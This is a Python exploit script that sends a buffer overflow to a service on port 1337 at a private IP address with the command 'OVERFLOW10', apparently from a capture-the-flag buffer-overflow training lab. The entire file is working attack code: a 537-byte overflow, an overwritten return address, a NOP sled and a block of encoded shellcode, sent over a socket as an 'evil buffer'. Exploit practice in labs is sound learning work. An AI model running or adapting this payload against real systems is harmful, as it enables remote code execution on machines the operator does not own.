#!/usr/bin/python3

import socket

ip = "10.10.240.201"
port = 1337

prefix = "OVERFLOW10 "
offset = 537
overflow = "A" * offset
retn = "\xaf\x11\x50\x62"
padding = "\x90" * 16
payload = ("\x29\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
"\x60\x83\xba\x16\x83\xee\xfc\xe2\xf4\x9c\x6b\x38\x16\x60\x83"
"\xda\x9f\x85\xb2\x7a\x72\xeb\xd3\x8a\x9d\x32\x8f\x31\x44\x74"
"\x08\xc8\x3e\x6f\x34\xf0\x30\x51\x7c\x16\x2a\x01\xff\xb8\x3a"
"\x40\x42\x75\x1b\x61\x44\x58\xe4\x32\xd4\x31\x44\x70\x08\xf0"
"\x2a\xeb\xcf\xab\x6e\x83\xcb\xbb\xc7\x31\x08\xe3\x36\x61\x50"
"\x31\x5f\x78\x60\x80\x5f\xeb\xb7\x31\x17\xb6\xb2\x45\xba\xa1"
"\x4c\xb7\x17\xa7\xbb\x5a\x63\x96\x80\xc7\xee\x5b\xfe\x9e\x63"
"\x84\xdb\x31\x4e\x44\x82\x69\x70\xeb\x8f\xf1\x9d\x38\x9f\xbb"
"\xc5\xeb\x87\x31\x17\xb0\x0a\xfe\x32\x44\xd8\xe1\x77\x39\xd9"
"\xeb\xe9\x80\xdc\xe5\x4c\xeb\x91\x51\x9b\x3d\xeb\x89\x24\x60"
"\x83\xd2\x61\x13\xb1\xe5\x42\x08\xcf\xcd\x30\x67\x7c\x6f\xae"
"\xf0\x82\xba\x16\x49\x47\xee\x46\x08\xaa\x3a\x7d\x60\x7c\x6f"
"\x46\x30\xd3\xea\x56\x30\xc3\xea\x7e\x8a\x8c\x65\xf6\x9f\x56"
"\x2d\x7c\x65\xeb\xb0\x10\x7d\x16\xd2\x14\x60\x92\xe6\x9f\x86"
"\xe9\xaa\x40\x37\xeb\x23\xb3\x14\xe2\x45\xc3\xe5\x43\xce\x1a"
"\x9f\xcd\xb2\x63\x8c\xeb\x4a\xa3\xc2\xd5\x45\xc3\x08\xe0\xd7"
"\x72\x60\x0a\x59\x41\x37\xd4\x8b\xe0\x0a\x91\xe3\x40\x82\x7e"
"\xdc\xd1\x24\xa7\x86\x17\x61\x0e\xfe\x32\x70\x45\xba\x52\x34"
"\xd3\xec\x40\x36\xc5\xec\x58\x36\xd5\xe9\x40\x08\xfa\x76\x29"
"\xe6\x7c\x6f\x9f\x80\xcd\xec\x50\x9f\xb3\xd2\x1e\xe7\x9e\xda"
"\xe9\xb5\x38\x5a\x0b\x4a\x89\xd2\xb0\xf5\x3e\x27\xe9\xb5\xbf"
"\xbc\x6a\x6a\x03\x41\xf6\x15\x86\x01\x51\x73\xf1\xd5\x7c\x60"
"\xd0\x45\xc3")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
